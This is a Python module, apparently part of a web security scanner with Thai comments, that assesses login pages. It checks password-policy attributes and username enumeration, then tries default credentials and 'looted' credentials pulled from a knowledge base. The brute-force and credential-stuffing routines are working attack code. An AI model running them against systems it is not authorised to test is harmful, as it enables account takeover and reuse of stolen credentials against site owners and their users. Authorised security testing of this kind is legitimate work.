import aiohttp
import asyncio
import time
from bs4 import BeautifulSoup

# คู่รหัสผ่านยอดนิยมที่ Admin ชอบมักง่าย
DEFAULT_CREDS = [
    ("admin", "admin"),
    ("admin", "password"),
    ("admin", "123456"),
    ("root", "root"),
    ("user", "user"),
    ("test", "test"),
    ("administrator", "password")
]

async def check_password_policy(soup, url):
    """
    Passive check: Analyze login form for weak policy indicators.
    """
    findings = []
    form = soup.find('form')
    if not form: return findings
    
    password_field = form.find('input', {'type': 'password'})
    if not password_field: return findings
    
    # 1. Check for missing minlength or pattern attributes (Client-side)
    min_len = password_field.get('minlength')
    pattern = password_field.get('pattern')
    
    if not min_len and not pattern:
         findings.append({
            "type": "Weak Password Policy (Client-Side)",
            "severity": "Low",
            "detail": "Login form does not enforce password complexity (minlength/pattern) via HTML parameters.",
            "evidence": f"URL: {url}\nInput: {password_field}",
            "remediation": "Enforce strong password policies (min 8 chars, complexity) on both client and server."
        })
    elif min_len and int(min_len) < 8:
        findings.append({
            "type": "Weak Password Policy (Short Length Inferred)",
            "severity": "Medium",
            "detail": f"Login form allows weak passwords (minlength={min_len}).",
            "evidence": f"URL: {url}\nAttribute: minlength={min_len}",
            "remediation": "Require at least 8-12 characters."
        })
        
    return findings

async def check_username_enumeration(session, url, form_details):
    """
    Active check: Time-based and Error-based enumeration.
    """
    findings = []
    
    # Needs at least one field to be 'user' and 'pass'
    user_field = next((k for k in form_details.keys() if "user" in k.lower() or "mail" in k.lower()), None)
    pass_field = next((k for k in form_details.keys() if "pass" in k.lower()), None)
    
    if not user_field or not pass_field: return []

    # Prepare payloads
    target_user = "admin" # Likely to exist
    fake_user = "nonexistent_99999" # Likely to not exist
    dummy_pass = "WrongPass123!"
    
    # Helper to send request
    async def send_login(u, p):
        data = form_details.copy()
        data[user_field] = u
        data[pass_field] = p
        
        start = time.time()
        try:
             async with session.post(url, data=data, timeout=10, ssl=False) as resp:
                text = await resp.text()
                return text, time.time() - start
        except Exception: return "", 0

    # 1. Error-Based Check
    text_exist, time_exist = await send_login(target_user, dummy_pass)
    text_fake, time_fake = await send_login(fake_user, dummy_pass)
    
    # Normalize text to reduce noise (strip nonce/tokens if simple)
    # Heuristic: If one says "User not found" and other "Incorrect password"
    if "user not found" in text_fake.lower() and "password" in text_exist.lower():
         findings.append({
            "type": "Username Enumeration (Error Message)",
            "severity": "Medium",
            "detail": "Application reveals if a username exists via specific error messages.",
            "evidence": f"User '{fake_user}': 'User not found'\nUser '{target_user}': 'Incorrect password'",
            "remediation": "Use generic error messages like 'Invalid username or password'."
        })
    elif len(text_exist) != len(text_fake) and abs(len(text_exist) - len(text_fake)) > 20:
         # If response length varies significantly
          findings.append({
            "type": "Username Enumeration (Response Size)",
            "severity": "Low",
            "detail": "Response size differs significantly between valid and invalid usernames.",
            "evidence": f"User '{target_user}' Len: {len(text_exist)}\nUser '{fake_user}' Len: {len(text_fake)}",
            "remediation": "Ensure consistent response behavior."
        })

    # 2. Time-Based Check
    # Valid user usually takes longer (hashing) than invalid user (early exit)
    # We need a significant difference > 100ms or 2x
    if time_exist > time_fake + 0.5: # 500ms diff is huge
         findings.append({
            "type": "Username Enumeration (Timing Attack)",
            "severity": "Low",
            "detail": "Valid username took significantly longer to process.",
            "evidence": f"User '{target_user}': {time_exist:.2f}s\nUser '{fake_user}': {time_fake:.2f}s",
            "remediation": "Use constant-time comparison or dummy hashing for invalid users."
        })
        
    return findings

async def try_login(session, url, username, password):
    try:
        # 1. Get Page to find inputs
        async with session.get(url, timeout=5, ssl=False) as resp:
            html = await resp.text()
            soup = BeautifulSoup(html, 'html.parser')
            form = soup.find('form')
            if not form: return None
            
            # Find inputs
            data = {}
            for inp in form.find_all('input'):
                name = inp.get('name')
                if not name: continue
                
                # Guess field types
                if "user" in name.lower() or "mail" in name.lower() or "login" in name.lower():
                    data[name] = username
                elif "pass" in name.lower():
                    data[name] = password
                else:
                    data[name] = inp.get('value', '')
            
            # ถ้าหาช่องกรอกไม่เจอ ก็ข้าม
            if not any("pass" in k.lower() for k in data.keys()):
                return None
            
            # [RETURNS DATA FOR ENUM CHECK]
            if username == "ENUM_CHECK":
                return {"soup": soup, "form_data": data}

            # 2. Post Data
            action = form.get('action') or ""
            # Handle relative URL
            from urllib.parse import urljoin
            post_url = urljoin(url, action)
            
            async with session.post(post_url, data=data, timeout=5, ssl=False, allow_redirects=True) as login_resp:
                # Logic การเช็คว่า Login สำเร็จ
                # - Status 200 แต่หน้าเปลี่ยนไป (ไม่ใช่หน้าเดิม)
                # - มีการ Redirect (302) ไปหน้า Dashboard
                # - เนื้อหาหน้าเว็บเปลี่ยน (ไม่มีคำว่า "Login" หรือ "Wrong password")
                
                res_text = await login_resp.text()
                
                # Simple Success Indicators
                success_keywords = ["dashboard", "welcome", "logout", "admin panel", "profile"]
                fail_keywords = ["invalid", "wrong", "failed", "incorrect", "try again"]
                
                if any(k in res_text.lower() for k in success_keywords) and not any(k in res_text.lower() for k in fail_keywords):
                    # Double check size difference
                    if len(res_text) != len(html):
                        return {
                            "username": username,
                            "password": password,
                            "url": url
                        }
    except Exception:
        pass
    return None

async def run_admin_brute(target_url, crawled_urls, log_callback=None, headers=None):
    findings = []
    login_urls = [u for u in crawled_urls if "login" in u.lower() or "admin" in u.lower() or "signin" in u.lower()]
    
    if not login_urls:
        return findings

    if log_callback: log_callback(f"🚪 Found {len(login_urls)} login portals. Assessing Auth Security...")
    
    async with aiohttp.ClientSession(headers=headers) as session:
        for url in login_urls[:3]: # ลองแค่ 3 หน้าแรกที่น่าจะเป็น Login
            # 1. Advanced Auth Checks (Enum & Policy)
            # Fetch form details first
            try:
                info = await try_login(session, url, "ENUM_CHECK", "")
                if info:
                    soup = info['soup']
                    form_data = info['form_data']
                    
                    # Check Policy
                    policy_findings = await check_password_policy(soup, url)
                    findings.extend(policy_findings)
                    
                    # Check Enumeration
                    enum_findings = await check_username_enumeration(session, url, form_data)
                    findings.extend(enum_findings)
            except Exception: pass

            # 2. Brute Force & Credential Stuffing
            if log_callback: log_callback(f"   Attempting Login (Defaults + Stuffing) on {url}...")
            
            # [CREDENTIAL STUFFING]
            from core.kb import kb
            target_creds = DEFAULT_CREDS.copy()
            # Add looted credentials
            for c in kb.credentials: # Assuming format {'username': '...', 'password': '...'}
                if c.get('username') and c.get('password'):
                    target_creds.append((c['username'], c['password']))

            for user, pwd in target_creds:
                result = await try_login(session, url, user, pwd)
                if result and not isinstance(result, dict): continue # Skip if error
                if result and isinstance(result, dict) and "username" in result:
                    findings.append({
                        "type": "Default Credentials (Admin Takeover)",
                        "severity": "Critical",
                        "detail": f"Successfully logged into {url}",
                        "evidence": f"Username: {result['username']}\nPassword: {result['password']}\nStatus: Login Successful",
                        "remediation": "Change default credentials immediately."
                    })
                    if log_callback: log_callback(f"🔥 PWNED! Valid Creds: {result['username']}:{result['password']} @ {url}")
                    return findings # เจอแล้วพอเลย (Proof of Concept)
                    
    return findings